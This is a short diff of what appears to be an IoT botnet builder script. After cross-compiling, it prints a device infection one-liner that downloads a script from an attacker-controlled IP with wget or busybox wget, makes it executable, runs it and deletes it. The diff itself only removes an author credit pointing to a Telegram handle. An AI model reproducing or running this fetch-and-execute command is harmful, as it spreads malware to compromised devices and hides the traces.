@@ -113,8 +113,6 @@ def main():
     print(f"{Fore.LIGHTGREEN_EX}Successfully cross compiled!{Fore.WHITE}")
     print(f"{Fore.LIGHTYELLOW_EX}cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/{script_name}; busybox wget http://{ip}/{script_name}; chmod 777 {script_name}; sh {script_name}; rm -f {script_name}{Fore.WHITE}")
     print()
-    print(f"Created by UDPKITTY https://t.me/udpkitty")
-    print()
 
 
 if __name__ == '__main__':
